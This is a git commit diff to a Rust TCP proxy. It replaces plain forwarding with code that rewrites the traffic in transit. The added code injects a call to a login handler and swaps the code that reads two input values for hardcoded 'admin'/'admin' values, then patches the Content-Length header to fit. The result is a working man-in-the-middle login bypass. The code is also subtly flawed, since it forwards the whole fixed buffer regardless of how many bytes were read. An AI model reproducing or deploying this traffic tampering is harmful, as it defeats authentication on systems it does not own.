71021d386d8c73e722c525f10c62560a77e896bc
York Xiang <bombless@126.com>
2021-07-07 18:12:01 +0800

    test

--- src/main.rs
+++ src/main.rs
@@ -5,11 +5,24 @@ use structopt::StructOpt;
 use tokio::io::copy;
 use tokio::net::{TcpListener, TcpStream};
 use tokio::task::JoinHandle;
+use kmp::kmp_find;
+use tokio::io::{AsyncReadExt, AsyncWriteExt};
 
 #[derive(Eq, PartialEq, Hash)]
 enum TaskType {
     WriteTask,
     ReadTask,
+}
+
+fn replace(from: &[u8], to: &[u8], source: &[u8]) -> Vec<u8> {
+    let search: Option<usize> = kmp_find(from, source);
+    if let Some(idx) = search {
+        let mut new_vec = Vec::from(&source[0 .. idx]);
+        new_vec.extend(to);
+        new_vec.extend(&source[idx + from.len() .. ]);
+        return new_vec;
+    }
+    return Vec::from(source);
 }
 
 async fn process_conn(local: TcpStream, remote: TcpStream) {
@@ -19,7 +32,21 @@ async fn process_conn(local: TcpStream, remote: TcpStream) {
     let mut tasks_map: HashMap<TaskType, JoinHandle<_>> = HashMap::new();
 
     let write_task = tokio::spawn(async move {
-        copy(&mut local_reader, &mut remote_writer).await
+        // copy(&mut local_reader, &mut remote_writer).await;
+        let mut buffer: [u8; 256 * 256] = [0; 256 * 256];
+        local_reader.read(&mut buffer).await.unwrap();
+        let replaces: [[&'static [u8]; 2]; 2] = [
+            [b"this._beforeLogin()", b"this._beforeLogin();this._onLogin()"],
+            [b"s=o.getValue(),r=n.getValue()",b"s='admin',r='admin'"],
+        ];
+        let mut value = Vec::from(&buffer[..]);
+        let mut diff = 0;
+        for [from, to] in replaces {
+            value = replace(from, to, &value[..]);
+            diff += to.len() - from.len();
+        }
+        value = replace(b"CONTENT-LENGTH: 6236", format!("CONTENT-LENGTH: {}", diff + 6236).as_bytes(), &value[..]);
+        remote_writer.write_all(&value[..]).await.map(|_| 0)
     });
     tasks_map.insert(TaskType::WriteTask, write_task);
 
